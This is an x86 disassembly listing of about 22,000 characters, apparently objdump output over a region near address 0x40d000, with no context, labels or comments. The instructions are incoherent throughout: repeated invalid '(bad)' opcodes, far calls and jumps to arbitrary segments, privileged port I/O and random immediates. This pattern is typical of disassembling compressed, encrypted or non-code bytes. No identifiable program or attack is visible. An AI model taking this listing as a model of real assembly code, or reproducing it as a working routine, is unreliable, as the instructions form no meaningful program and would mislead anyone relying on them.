  40ce5f:	add    BYTE PTR [ecx],dl
  40ce61:	out    dx,eax
  40ce62:	push   ds
  40ce63:	jmp    FWORD PTR [esi-0x15]
  40ce66:	adc    al,ch
  40ce68:	stos   BYTE PTR es:[edi],al
  40ce69:	cdq    
  40ce6a:	(bad)  
  40ce6b:	jne    0x40cdf3
  40ce6d:	(bad)  
  40ce6e:	pop    ds
  40ce6f:	dec    ecx
  40ce70:	ret    
  40ce71:	mov    WORD PTR [esi+0x3296c7c],cs
  40ce77:	ins    DWORD PTR es:[edi],dx
  40ce78:	sti    
  40ce79:	adc    al,0x5d
  40ce7b:	ins    DWORD PTR es:[edi],dx
  40ce7c:	push   cs
  40ce7d:	push   ebx
  40ce7e:	jne    0x40ce42
  40ce80:	xchg   edx,eax
  40ce81:	fimul  DWORD PTR [eax+0x58]
  40ce84:	or     DWORD PTR ds:0x131a3ea0,0x9668ec9c
  40ce8e:	test   al,0xd8
  40ce90:	cld    
  40ce91:	fcom   DWORD PTR [esi]
  40ce93:	xchg   ebx,eax
  40ce94:	pop    esp
  40ce95:	shl    BYTE PTR [ecx],cl
  40ce97:	or     eax,0x956aa053
  40ce9c:	repz push ds
  40ce9e:	add    DWORD PTR [edi],edi
  40cea0:	outs   dx,DWORD PTR ds:[esi]
  40cea1:	dec    edi
  40cea2:	jb     0x40ce44
  40cea4:	cld    
  40cea5:	fsubp  st(5),st
  40cea7:	pop    es
  40cea8:	cmp    eax,0xad8ea7ca
  40cead:	push   ds
  40ceae:	ret    
  40ceaf:	arpl   WORD PTR [esp-0x79],bx
  40ceb3:	ins    DWORD PTR es:[edi],dx
  40ceb4:	cwde   
  40ceb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceb6:	pop    edi
  40ceb7:	es push esp
  40ceb9:	adc    eax,0xfb56efda
  40cebe:	stos   BYTE PTR es:[edi],al
  40cebf:	add    eax,0x6d971509
  40cec4:	xchg   esi,eax
  40cec5:	dec    edx
  40cec6:	cmp    DWORD PTR [ecx+0x1d],eax
  40cec9:	cdq    
  40ceca:	mov    ecx,0x5f2040c4
  40cecf:	mov    ?,WORD PTR [esi+0x4d]
  40ced2:	imul   eax,edi,0x82e55dab
  40ced8:	jge    0x40ce6a
  40ceda:	sub    ebp,edx
  40cedc:	xor    eax,0xe8bd0144
  40cee1:	out    dx,eax
  40cee2:	les    ecx,FWORD PTR [esi-0x4e]
  40cee5:	lods   eax,DWORD PTR ds:[esi]
  40cee6:	mov    ds:0x904aeed2,eax
  40ceeb:	push   ebx
  40ceec:	pop    ss
  40ceed:	jno    0x40ce88
  40ceef:	sar    BYTE PTR [eax],1
  40cef1:	jb     0x40ceee
  40cef3:	data16 loopne 0x40cf72
  40cef6:	and    bl,BYTE PTR [edi-0xf]
  40cef9:	jns    0x40cf1d
  40cefb:	in     eax,0xeb
  40cefd:	repnz pop ds
  40ceff:	(bad)  
  40cf00:	stc    
  40cf01:	push   ss
  40cf02:	(bad)  
  40cf03:	out    dx,al
  40cf04:	bound  esp,QWORD PTR [ebx]
  40cf06:	rol    DWORD PTR [ecx],1
  40cf08:	scas   eax,DWORD PTR es:[edi]
  40cf09:	retf   
  40cf0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0b:	add    al,0x5a
  40cf0d:	add    ah,cl
  40cf0f:	ret    0x7429
  40cf12:	inc    edx
  40cf13:	inc    edx
  40cf14:	cmp    esi,DWORD PTR [edi+0x7863bfde]
  40cf1a:	shl    BYTE PTR [esi],0xbd
  40cf1d:	int    0xf9
  40cf1f:	sbb    eax,0xb10aafd0
  40cf24:	pop    edx
  40cf25:	test   dh,ah
  40cf27:	inc    ecx
  40cf28:	pop    ss
  40cf29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf2a:	bound  esi,QWORD PTR [edx-0x3f113407]
  40cf30:	add    eax,0x5881c65b
  40cf35:	out    0x9d,eax
  40cf37:	or     eax,0x27e05ff7
  40cf3c:	add    ecx,DWORD PTR [esi+0x71073b4e]
  40cf42:	xchg   edi,eax
  40cf43:	mov    ebx,0x585e839c
  40cf48:	mov    cl,0x66
  40cf4a:	mov    WORD PTR [eax],?
  40cf4c:	addr16 call 0xabe3:0xe71f1253
  40cf54:	imul   edi,DWORD PTR [edx-0x27],0xa9b878f9
  40cf5b:	fimul  DWORD PTR [ecx-0x184a9bb4]
  40cf61:	sub    eax,0xeff0456b
  40cf66:	inc    ebx
  40cf67:	jp     0x40cef0
  40cf69:	jg     0x40cf04
  40cf6b:	dec    esi
  40cf6c:	xor    DWORD PTR [ebp-0xd349280],edi
  40cf72:	lea    ecx,[edx+0x39c81c38]
  40cf78:	pop    es
  40cf79:	fwait
  40cf7a:	lea    eax,[ebp+0x6c]
  40cf7d:	test   BYTE PTR [eax-0x7d],dh
  40cf80:	push   esi
  40cf81:	and    DWORD PTR [ecx-0x3e],0xbad85916
  40cf88:	sub    BYTE PTR [ebx],ch
  40cf8a:	dec    edi
  40cf8b:	dec    esp
  40cf8c:	cmc    
  40cf8d:	pop    esi
  40cf8e:	sbb    eax,0xd9c0f0cb
  40cf93:	popa   
  40cf94:	aam    0xbc
  40cf96:	sahf   
  40cf97:	cmp    esp,DWORD PTR [edx]
  40cf99:	jecxz  0x40cf91
  40cf9b:	push   ebp
  40cf9c:	inc    esp
  40cf9d:	gs cwde 
  40cf9f:	mov    bl,0x9b
  40cfa1:	push   es
  40cfa2:	push   ss
  40cfa3:	pop    ss
  40cfa4:	add    DWORD PTR [ebp-0x71],ebx
  40cfa7:	dec    eax
  40cfa8:	daa    
  40cfa9:	iret   
  40cfaa:	jne    0x40cfe1
  40cfac:	add    BYTE PTR ds:0x802eec9f,bh
  40cfb2:	mov    ds:0x7f294e1,eax
  40cfb7:	xchg   ebx,eax
  40cfb8:	retf   
  40cfb9:	sbb    eax,0xf709d341
  40cfbe:	mov    DWORD PTR [edx+0x384a5864],edx
  40cfc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfc5:	jnp    0x40d040
  40cfc7:	mov    ebx,0x12965a87
  40cfcc:	es test al,0x92
  40cfcf:	sbb    al,0x6c
  40cfd1:	inc    edi
  40cfd2:	shl    ah,1
  40cfd4:	sbb    DWORD PTR [eax+0x615c8c9c],edi
  40cfda:	(bad)  
  40cfdb:	mov    edi,0xde299e09
  40cfe0:	and    eax,0xa54c1571
  40cfe5:	sbb    BYTE PTR [esi],bl
  40cfe7:	(bad)  
  40cfe8:	(bad)  
  40cfea:	sub    esp,ebx
  40cfec:	in     eax,0xc9
  40cfee:	xchg   DWORD PTR [ecx],ebx
  40cff0:	neg    BYTE PTR [ebx-0x5e22bc69]
  40cff6:	loop   0x40d04a
  40cff8:	dec    ebx
  40cff9:	idiv   bl
  40cffb:	in     al,0xa8
  40cffd:	xchg   edi,eax
  40cffe:	xchg   edi,eax
  40cfff:	push   edi
  40d000:	pop    ss
  40d001:	sbb    bh,BYTE PTR [eax+ebx*1+0x3fd818b5]
  40d008:	xlat   BYTE PTR ds:[ebx]
  40d009:	in     al,0x9b
  40d00b:	mov    cs:0xc049d36,eax
  40d011:	popa   
  40d012:	sbb    DWORD PTR [ebp-0x31858a81],esi
  40d018:	cmp    esi,esp
  40d01a:	mov    bh,0x44
  40d01c:	les    eax,FWORD PTR [esi+0x64c46d31]
  40d022:	mov    al,0xf2
  40d024:	mov    eax,DWORD PTR [ebx-0x7a]
  40d027:	xor    ch,dh
  40d029:	ds or  ebp,ecx
  40d02c:	ror    DWORD PTR [esi-0xd],cl
  40d02f:	nop
  40d030:	sbb    bl,BYTE PTR ds:0x98be3845
  40d036:	adc    eax,0xaf5f0dee
  40d03b:	aam    0x5c
  40d03d:	mov    ebx,0x6a7b6534
  40d042:	cld    
  40d043:	xor    BYTE PTR ds:0x5fe6be5,dl
  40d049:	ins    BYTE PTR es:[edi],dx
  40d04a:	push   ebp
  40d04b:	and    DWORD PTR [edx+0x65b3997a],ebx
  40d051:	dec    eax
  40d052:	inc    ebx
  40d053:	out    dx,al
  40d054:	xchg   ebp,eax
  40d055:	in     al,dx
  40d056:	mov    ch,0xf
  40d058:	mov    dl,0x50
  40d05a:	pop    ebp
  40d05b:	popf   
  40d05c:	pop    ecx
  40d05d:	mov    eax,0x964ee638
  40d062:	aaa    
  40d063:	mov    DWORD PTR cs:[esi+esi*1],ebp
  40d067:	shr    DWORD PTR [eax],0xef
  40d06a:	js     0x40d08b
  40d06c:	jle    0x40d0db
  40d06e:	sub    bl,BYTE PTR [edi]
  40d070:	adc    bh,cl
  40d072:	dec    BYTE PTR [edi]
  40d074:	cld    
  40d075:	fdiv   DWORD PTR [edx-0x56c72893]
  40d07b:	sbb    al,0x6a
  40d07d:	sbb    BYTE PTR [ecx+0x73],cl
  40d080:	outs   dx,DWORD PTR ds:[esi]
  40d081:	dec    ebx
  40d082:	addr16 sub ecx,esi
  40d085:	mov    esp,0xc1085272
  40d08a:	sbb    ah,BYTE PTR [eax]
  40d08c:	sbb    BYTE PTR [ebp+0x7ed95ca9],0x98
  40d093:	mov    edx,0xad4df784
  40d098:	add    eax,0x454f3808
  40d09d:	push   ds
  40d09e:	push   es
  40d09f:	xchg   edx,eax
  40d0a0:	add    esi,0xbdb753af
  40d0a6:	pushf  
  40d0a7:	dec    ecx
  40d0a8:	xor    cl,0x98
  40d0ab:	add    esp,DWORD PTR ds:0xd5ca68df
  40d0b1:	mov    DWORD PTR [esi+edx*2-0x74],ecx
  40d0b5:	mov    ebx,0xadc666bf
  40d0bb:	xchg   ecx,eax
  40d0bc:	adc    al,0x30
  40d0be:	push   eax
  40d0bf:	fdivr  QWORD PTR [edx]
  40d0c1:	retf   
  40d0c2:	das    
  40d0c3:	lds    esi,FWORD PTR [esi+0x1b]
  40d0c6:	repnz mov edx,0x13103ecf
  40d0cc:	arpl   WORD PTR [ebp-0x5e],cx
  40d0cf:	inc    ebx
  40d0d0:	jecxz  0x40d0c2
  40d0d2:	jo     0x40d109
  40d0d4:	push   ecx
  40d0d5:	push   edi
  40d0d6:	sub    esp,DWORD PTR [eax+0x699b10c]
  40d0dc:	sar    ah,1
  40d0de:	push   esi
  40d0df:	stc    
  40d0e0:	sub    al,0xd
  40d0e2:	imul   eax,DWORD PTR [edx+ebp*1+0x54],0xc28710fc
  40d0ea:	fcom   DWORD PTR [edx-0x367ef703]
  40d0f0:	outs   dx,DWORD PTR ds:[esi]
  40d0f1:	jecxz  0x40d085
  40d0f3:	loop   0x40d132
  40d0f5:	mov    eax,0x8a2e0c6
  40d0fa:	add    al,0x74
  40d0fc:	sub    DWORD PTR [esi-0x1e],0x5db2d563
  40d103:	xchg   DWORD PTR [esi-0x2b2e687a],ebp
  40d109:	mov    bh,BYTE PTR [edi-0x2f]
  40d10c:	call   0xcf92:0x921279f2
  40d113:	std    
  40d114:	dec    eax
  40d115:	fist   WORD PTR [ecx]
  40d117:	in     eax,dx
  40d118:	stos   BYTE PTR es:[edi],al
  40d119:	dec    ebp
  40d11a:	pop    ecx
  40d11b:	mov    cl,0x22
  40d11d:	mov    dl,0x3e
  40d11f:	fistp  DWORD PTR [eax+eax*8+0x58]
  40d123:	(bad)  
  40d124:	leave  
  40d125:	in     al,dx
  40d126:	arpl   WORD PTR [esi-0x13d79569],sp
  40d12c:	scas   al,BYTE PTR es:[edi]
  40d12d:	out    dx,eax
  40d12e:	aas    
  40d12f:	sbb    eax,0xf3dc06d0
  40d134:	pop    ebx
  40d135:	and    BYTE PTR [ebx+0x3623f141],0x24
  40d13c:	push   ds
  40d13d:	adc    eax,0xa9cad550
  40d142:	or     BYTE PTR ds:0x57c0530,0xd
  40d149:	je     0x40d121
  40d14b:	out    0x67,al
  40d14d:	cld    
  40d14e:	fisub  WORD PTR ds:0xdd23cc83
  40d154:	add    BYTE PTR [eax],0xc0
  40d157:	ror    BYTE PTR [edi+ebx*2+0x2563f26b],0x73
  40d15f:	lds    ebp,FWORD PTR [edx+0xf0b0598]
  40d165:	in     al,dx
  40d166:	daa    
  40d167:	fild   DWORD PTR [ecx-0xa]
  40d16a:	enter  0x5dda,0xcc
  40d16e:	ins    BYTE PTR es:[edi],dx
  40d16f:	pop    esp
  40d170:	lods   eax,DWORD PTR ds:[esi]
  40d171:	add    eax,0xeb26a03
  40d176:	aas    
  40d177:	dec    esi
  40d178:	mov    dl,0x76
  40d17a:	fiadd  WORD PTR [esi-0x42121483]
  40d180:	pop    eax
  40d181:	(bad)  
  40d182:	(bad)  
  40d184:	or     bl,BYTE PTR [ecx-0x22]
  40d187:	inc    edx
  40d188:	repz iret 
  40d18a:	cs sub al,0x59
  40d18d:	inc    eax
  40d18e:	jmp    0x1ab5078f
  40d193:	and    BYTE PTR [eax],dh
  40d195:	int3   
  40d196:	mov    cl,0x8a
  40d198:	xchg   edi,eax
  40d199:	out    dx,eax
  40d19a:	mov    ds:0x7437bfcc,al
  40d19f:	stc    
  40d1a0:	ds cwde 
  40d1a2:	nop
  40d1a3:	sbb    BYTE PTR [esi],0xa0
  40d1a6:	js     0x40d187
  40d1a8:	add    dh,BYTE PTR [ebx-0x77]
  40d1ab:	ds and eax,0x4d840c08
  40d1b1:	fdivr  st(0),st
  40d1b3:	lods   eax,DWORD PTR ds:[esi]
  40d1b4:	xchg   DWORD PTR [ebx+0x14d71e2b],ebp
  40d1ba:	loope  0x40d1c6
  40d1bc:	lds    ecx,FWORD PTR [esi+0x3d98d52e]
  40d1c2:	repnz inc ebp
  40d1c4:	cdq    
  40d1c5:	cs cdq 
  40d1c7:	sbb    DWORD PTR [esi],0xffffffde
  40d1ca:	clc    
  40d1cb:	push   cs
  40d1cc:	sbb    ah,BYTE PTR [edx+0x21a26e52]
  40d1d2:	sbb    DWORD PTR [eax*2+0x16a88517],ebx
  40d1d9:	push   esi
  40d1da:	dec    esi
  40d1db:	adc    al,0x60
  40d1dd:	sub    esp,DWORD PTR [esi-0x23]
  40d1e0:	sbb    DWORD PTR [esi-0x2a1fc42a],edx
  40d1e6:	xchg   edi,eax
  40d1e7:	pop    ecx
  40d1e8:	nop
  40d1e9:	stos   BYTE PTR es:[edi],al
  40d1ea:	aaa    
  40d1eb:	rcl    DWORD PTR [ebp+0x6064b426],1
  40d1f1:	dec    ecx
  40d1f2:	mov    DWORD PTR [ebp+0x50],esi
  40d1f5:	(bad)  
  40d1f6:	ins    BYTE PTR es:[edi],dx
  40d1f7:	aad    0x8a
  40d1f9:	inc    eax
  40d1fa:	movhps QWORD PTR [ecx+0x60b69cab],xmm1
  40d201:	neg    BYTE PTR [edi+0xf]
  40d204:	daa    
  40d205:	or     eax,0x623b73e4
  40d20a:	ins    BYTE PTR es:[edi],dx
  40d20b:	mov    ch,0x37
  40d20d:	add    al,0xe9
  40d20f:	ret    0xc497
  40d212:	popa   
  40d213:	fmulp  st(3),st
  40d215:	outs   dx,DWORD PTR ds:[esi]
  40d216:	test   al,0xad
  40d218:	adc    bh,dl
  40d21a:	add    al,0x37
  40d21c:	mov    DWORD PTR [edi+0x32de47e3],eax
  40d222:	lods   al,BYTE PTR ds:[esi]
  40d223:	add    bl,0x71
  40d226:	push   edx
  40d227:	aad    0x4c
  40d229:	jb     0x40d292
  40d22b:	sbb    al,0xd
  40d22d:	sbb    al,0xaa
  40d22f:	lea    edi,[edi+0x64857ddc]
  40d235:	push   esi
  40d236:	ds or  eax,0x4fe5e639
  40d23c:	hlt    
  40d23d:	and    bh,BYTE PTR [ecx-0x27]
  40d240:	ret    0xf964
  40d243:	arpl   WORD PTR [ebx-0x2c7c4d8f],si
  40d249:	cmc    
  40d24a:	mov    ?,esi
  40d24c:	xchg   BYTE PTR [edx],al
  40d24e:	mov    eax,0xadd711d9
  40d253:	lods   eax,DWORD PTR ds:[esi]
  40d254:	mov    eax,0x23babd7a
  40d259:	push   ebx
  40d25a:	or     ebx,DWORD PTR [ebx-0x3c6b8176]
  40d260:	sub    BYTE PTR [edi-0x1],ah
  40d263:	mov    dl,0x6f
  40d265:	std    
  40d266:	or     al,0xde
  40d268:	fld    QWORD PTR [ebp+0x7]
  40d26b:	inc    ecx
  40d26c:	xchg   eax,ebx
  40d26e:	test   eax,0xeda9c1f9
  40d273:	mov    ch,0xbd
  40d275:	or     cl,BYTE PTR [esp+edi*1]
  40d278:	cmp    dh,BYTE PTR [ecx-0x5d]
  40d27b:	mov    esi,0xa49db0
  40d280:	aaa    
  40d281:	cmp    bl,BYTE PTR [ecx]
  40d283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d284:	scas   al,BYTE PTR es:[edi]
  40d285:	mov    edx,0x7b94bf4a
  40d28a:	xor    BYTE PTR [edi+0x49ba2ddd],al
  40d290:	add    eax,0x1923e563
  40d295:	sbb    al,0x32
  40d297:	cmp    ch,BYTE PTR [esi-0x51]
  40d29a:	push   es
  40d29b:	mov    edx,?
  40d29d:	push   eax
  40d29f:	pop    esp
  40d2a0:	ror    BYTE PTR [ecx+esi*8+0x72],0xd7
  40d2a5:	lods   eax,DWORD PTR ds:[esi]
  40d2a6:	mov    DWORD PTR [ecx+0x66f399cc],edi
  40d2ac:	repz add ah,BYTE PTR [esi-0x37719398]
  40d2b3:	setle  BYTE PTR [ecx-0x6c36ca54]
  40d2ba:	fidiv  DWORD PTR [esi-0x2]
  40d2bd:	jnp    0x40d295
  40d2bf:	retf   0x985b
  40d2c2:	neg    DWORD PTR [edx+0x7b]
  40d2c5:	(bad)  
  40d2c6:	je     0x40d2bb
  40d2c8:	xchg   DWORD PTR [ecx],eax
  40d2ca:	loopne 0x40d2b4
  40d2cc:	jae    0x40d305
  40d2ce:	pop    edi
  40d2cf:	jge    0x40d2a0
  40d2d1:	loope  0x40d273
  40d2d3:	mov    ds:0xdd44582a,eax
  40d2d8:	icebp  
  40d2d9:	mov    ?,WORD PTR [ebx]
  40d2db:	lock mov ?,WORD PTR [esi+ecx*2]
  40d2df:	int    0xa6
  40d2e1:	add    dl,ah
  40d2e3:	call   0x504afef8
  40d2e8:	fwait
  40d2e9:	xchg   esp,eax
  40d2ea:	sbb    edx,DWORD PTR [eax+0x9]
  40d2ed:	icebp  
  40d2ee:	add    eax,0xabaee8f2
  40d2f3:	out    0xee,eax
  40d2f5:	data16 xor BYTE PTR [ebp+0x34662e3c],bl
  40d2fc:	xlat   BYTE PTR ds:[ebx]
  40d2fd:	rcl    DWORD PTR [ecx-0x282cf0e9],cl
  40d303:	call   0xe4e3:0xfacabb4e
  40d30a:	inc    edi
  40d30b:	xor    eax,0xee64827
  40d310:	les    ebx,FWORD PTR [ecx]
  40d312:	jl     0x40d34c
  40d314:	test   cl,dl
  40d316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d317:	ja     0x40d2bd
  40d319:	popw   ss
  40d31b:	jb     0x40d38e
  40d31d:	or     BYTE PTR [ebx],bl
  40d31f:	add    al,0xd
  40d321:	call   0x2d06:0x1824d93
  40d328:	jge    0x40d390
  40d32a:	fstp   DWORD PTR [edx]
  40d32c:	pop    esi
  40d32d:	or     al,0x72
  40d32f:	sbb    BYTE PTR [ecx+0x1a],dl
  40d332:	retf   
  40d333:	(bad)  
  40d334:	push   0xe3e50b7c
  40d339:	iret   
  40d33a:	shl    DWORD PTR ds:0x9a8b9eaf,1
  40d340:	mov    DWORD PTR [edx-0x23],eax
  40d343:	inc    eax
  40d344:	add    al,BYTE PTR [edi]
  40d346:	scas   al,BYTE PTR es:[edi]
  40d347:	cs push ecx
  40d349:	arpl   WORD PTR [edi-0x27eabfb1],ax
  40d34f:	mov    esp,0x20934925
  40d354:	pop    ss
  40d355:	fstp   DWORD PTR [edi]
  40d357:	and    bh,bl
  40d359:	test   al,0x68
  40d35b:	mov    edi,0x8a35d737
  40d360:	int    0xaa
  40d362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d363:	es inc ecx
  40d365:	ja     0x40d359
  40d367:	push   0xffffffc7
  40d369:	push   cs
  40d36a:	adc    al,0x9c
  40d36c:	sbb    dh,ah
  40d36e:	jmp    0x84da:0x1015fab8
  40d375:	and    DWORD PTR [esi-0x2e00155a],ebp
  40d37b:	int3   
  40d37c:	mul    ebp
  40d37e:	pop    edi
  40d37f:	xchg   edx,eax
  40d380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d381:	sbb    al,BYTE PTR [edi-0x78]
  40d384:	dec    edx
  40d385:	adc    esp,DWORD PTR [ebx+0x6]
  40d388:	jecxz  0x40d36f
  40d38a:	sti    
  40d38b:	addr16 (bad) 
  40d38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d38f:	lods   al,BYTE PTR ds:[esi]
  40d390:	loopne 0x40d323
  40d392:	mov    esp,0x44254ff2
  40d397:	inc    eax
  40d398:	fbld   TBYTE PTR es:[ebx]
  40d39b:	jmp    0xfc9d854f
  40d3a0:	sub    dl,BYTE PTR [edi+0x1d]
  40d3a3:	sbb    al,0xce
  40d3a5:	mov    eax,0xdf896184
  40d3aa:	fwait
  40d3ab:	scas   al,BYTE PTR es:[edi]
  40d3ac:	sbb    edx,DWORD PTR [eax+eiz*8]
  40d3af:	je     0x40d380
  40d3b1:	fnsave [ebx-0x29b839d6]
  40d3b7:	fdivr  DWORD PTR [eax]
  40d3b9:	dec    edx
  40d3ba:	xor    dh,dh
  40d3bc:	sub    ebx,edx
  40d3be:	mov    ebx,0x2f388626
  40d3c3:	and    al,0x63
  40d3c5:	mov    eax,ds:0x22afa01d
  40d3ca:	jg     0x40d34f
  40d3cc:	aam    0x84
  40d3ce:	mov    DWORD PTR [ecx],0x33faa77a
  40d3d4:	add    bl,dl
  40d3d6:	jl     0x40d430
  40d3d8:	adc    ch,cl
  40d3da:	mov    bh,ch
  40d3dc:	lods   al,BYTE PTR ds:[esi]
  40d3dd:	push   ds
  40d3de:	test   eax,0x707cde9d
  40d3e3:	fmul   DWORD PTR [edi]
  40d3e5:	shr    BYTE PTR [edx+ebp*8],cl
  40d3e8:	mov    ebx,0xa26ad371
  40d3ed:	clc    
  40d3ee:	inc    ebp
  40d3ef:	push   edx
  40d3f0:	nop
  40d3f1:	cwde   
  40d3f2:	inc    eax
  40d3f3:	and    al,0xba
  40d3f5:	xor    dh,BYTE PTR [edi-0x3]
  40d3f8:	push   esi
  40d3f9:	mov    ebx,0xa4026104
  40d3fe:	or     dh,dl
  40d400:	sub    esp,eax
  40d402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d403:	cld    
  40d404:	(bad)  
  40d406:	lock sub esi,ebp
  40d409:	jl     0x40d43d
  40d40b:	push   ecx
  40d40c:	sub    al,0xe2
  40d40e:	adc    esp,ecx
  40d410:	mov    cl,0x4f
  40d412:	test   eax,0xce73a901
  40d417:	xor    al,0x56
  40d419:	aad    0xf3
  40d41b:	and    al,0xc6
  40d41d:	pop    ds
  40d41e:	sub    eax,0x7031cb20
  40d423:	inc    ebx
  40d424:	(bad)  
  40d425:	cmc    
  40d426:	lds    esp,FWORD PTR [ebp+0x79c4ecaa]
  40d42c:	mov    ch,0x20
  40d42e:	scas   al,BYTE PTR es:[edi]
  40d42f:	jmp    0x40d42f
  40d431:	adc    eax,edi
  40d433:	(bad)
  40d436:	mov    edi,0x40d87f04
  40d43b:	dec    esi
  40d43c:	inc    ecx
  40d43d:	add    cl,bl
  40d43f:	data16 das 
  40d441:	in     al,0xd6
  40d443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d444:	mov    dh,0x96
  40d446:	int3   
  40d447:	test   bh,0x7d
  40d44a:	dec    esp
  40d44b:	cmc    
  40d44c:	pop    ecx
  40d44d:	out    0x90,eax
  40d44f:	(bad)  
  40d450:	retf   
  40d451:	fisubr DWORD PTR [ebx-0x27ca9571]
  40d457:	add    al,0x84
  40d459:	(bad)  
  40d45a:	push   ss
  40d45b:	sub    edi,DWORD PTR [edi-0x595e4622]
  40d461:	jg     0x40d415
  40d463:	pop    es
  40d464:	lahf   
  40d465:	cmp    ecx,DWORD PTR [ecx+0x4dd27ffe]
  40d46b:	push   edx
  40d46c:	and    DWORD PTR [edx+0x6823d45],ebp
  40d472:	jnp    0x40d492
  40d474:	xor    DWORD PTR [esi],ecx
  40d476:	mov    ecx,0xbb91244e
  40d47b:	inc    edx
  40d47c:	mov    esp,0xe20e2d87
  40d481:	xchg   esi,eax
  40d482:	fdiv   DWORD PTR [eax-0x24]
  40d485:	fmul   DWORD PTR [edx-0x361417f4]
  40d48b:	int3   
  40d48c:	mov    al,ds:0xdf2d4051
  40d491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d492:	push   0x2d6c5401
  40d497:	pusha  
  40d498:	pop    ss
  40d499:	test   ch,al
  40d49b:	jmp    0xf36e:0xb6818a65
  40d4a2:	mov    ah,0xd0
  40d4a4:	cmp    edx,ecx
  40d4a6:	pushf  
  40d4a7:	xor    BYTE PTR [edi+0xaaa3b15],dh
  40d4ad:	ret    
  40d4ae:	lock fdiv DWORD PTR [edi+eax*4+0x3828bc3d]
  40d4b6:	pop    ebx
  40d4b7:	test   BYTE PTR [eax+0x30081cc],dl
  40d4bd:	stos   BYTE PTR es:[edi],al
  40d4be:	jp     0x40d504
  40d4c0:	jno    0x40d487
  40d4c2:	mov    cl,BYTE PTR fs:[ecx]
  40d4c5:	sub    ebp,esp
  40d4c7:	jl     0x40d492
  40d4c9:	stc    
  40d4ca:	adc    al,0xcc
  40d4cc:	pop    eax
  40d4cd:	aad    0x8
  40d4cf:	cs mov eax,0x9a2acf95
  40d4d5:	test   DWORD PTR [edi-0x18d3095d],edx
  40d4db:	mov    esi,0x17fe742b
  40d4e0:	xchg   ebx,eax
  40d4e1:	fdiv   DWORD PTR [edx+0x15]
  40d4e4:	sbb    eax,0xd3e56157
  40d4e9:	mov    dl,0x27
  40d4eb:	(bad)
  40d4f0:	pop    edx
  40d4f1:	pop    edi
  40d4f2:	dec    ecx
  40d4f3:	scas   al,BYTE PTR es:[edi]
  40d4f4:	outs   dx,BYTE PTR ds:[esi]
  40d4f5:	repnz dec edi
  40d4f7:	rcl    BYTE PTR [edx],0x39
  40d4fa:	push   ebp
  40d4fb:	sbb    BYTE PTR [edx+0x2f],dl
  40d4fe:	ja     0x40d4ec
  40d500:	shr    esi,cl
  40d502:	or     DWORD PTR [ebp-0x4d618695],0x42
  40d509:	jns    0x40d498
  40d50b:	mov    ds:0x18cda65c,eax
  40d510:	or     DWORD PTR [eax+0x69],ebp
  40d513:	push   ecx
  40d514:	arpl   WORD PTR [esi-0x20],bp
  40d517:	jno    0x40d53e
  40d519:	stos   DWORD PTR es:[edi],eax
  40d51a:	lea    ebp,[edx]
  40d51c:	daa    
  40d51d:	cmp    DWORD PTR [ecx],0x5a66bdfa
  40d523:	and    DWORD PTR [edx+0x16],esi
  40d526:	pop    ss
  40d527:	push   eax
  40d528:	(bad)  
  40d529:	out    dx,eax
  40d52a:	push   es
  40d52b:	clc    
  40d52c:	and    edi,ecx
  40d52e:	stos   DWORD PTR es:[edi],eax
  40d52f:	fmul   QWORD PTR [eax-0x55]
  40d532:	sbb    eax,0xcd891cd0
  40d537:	xor    DWORD PTR [ecx+eax*4+0x5f],0xc2e0e3ed
  40d53f:	jno    0x40d538
  40d541:	push   ebp
  40d542:	mov    ebx,DWORD PTR [edx-0x37]
  40d545:	push   esp
  40d546:	sar    DWORD PTR [ecx-0x4a5a6a42],cl
  40d54c:	adc    BYTE PTR [ecx-0x5b],dl
  40d54f:	mov    cs,esi
  40d551:	clc    
  40d552:	fadd   QWORD PTR [esi+0x10762fc]
  40d558:	xchg   ecx,eax
  40d559:	out    dx,al
  40d55a:	cdq    
  40d55b:	jg     0x40d519
  40d55d:	push   ss
  40d55e:	addr16 and dl,ah
  40d561:	mov    ds:0xfdff34c5,eax
  40d566:	adc    ebx,eax
  40d568:	aad    0x37
  40d56a:	push   ebp
  40d56b:	icebp  
  40d56c:	mov    ecx,fs
  40d56e:	mov    ecx,0xcbb0da54
  40d573:	lahf   
  40d574:	ins    BYTE PTR es:[edi],dx
  40d575:	sbb    BYTE PTR [esp+eax*8],ah
  40d578:	retf   0x7b2
  40d57b:	mov    dl,0xb3
  40d57d:	lods   eax,DWORD PTR ds:[esi]
  40d57e:	sub    DWORD PTR [eax+ebx*2],0x34f3c561
  40d585:	je     0x40d605
  40d587:	jp     0x40d53b
  40d589:	arpl   bx,si
  40d58b:	or     bh,BYTE PTR [edi-0x26]
  40d58e:	int    0x8c
  40d590:	ins    DWORD PTR es:[edi],dx
  40d591:	push   edi
  40d592:	xchg   ebx,eax
  40d593:	cs inc edi
  40d595:	jg     0x40d544
  40d597:	pop    ebp
  40d598:	rcr    DWORD PTR [edi+0x58f305de],1
  40d59e:	ja     0x40d53f
  40d5a0:	out    dx,al
  40d5a1:	mov    bh,0xb3
  40d5a3:	sub    DWORD PTR ds:0x1eb79ffa,esp
  40d5a9:	es mov al,0x8f
  40d5ac:	mov    esi,0x5632d1ab
  40d5b1:	call   0x354d7556
  40d5b6:	repz mov WORD PTR [ebp+0x3e2d172a],?
  40d5bd:	jmp    0x14a601d
  40d5c2:	js     0x40d624
  40d5c4:	shl    DWORD PTR [edi+0x19],cl
  40d5c7:	xchg   edx,eax
  40d5c8:	add    eax,0xf90f8e0a
  40d5cd:	into   
  40d5ce:	retf   0xa941
  40d5d1:	enter  0x738b,0xd5
  40d5d5:	pop    ds
  40d5d6:	xchg   al,dh
  40d5d8:	mov    ds:0xfeb0bab8,al
  40d5dd:	cmp    bl,BYTE PTR [edi+0x2b]
  40d5e0:	pop    esp
  40d5e1:	add    eax,0x380c25e0
  40d5e6:	xchg   ebx,eax
  40d5e7:	bound  eax,QWORD PTR [edi+eax*2+0x3ef0b447]
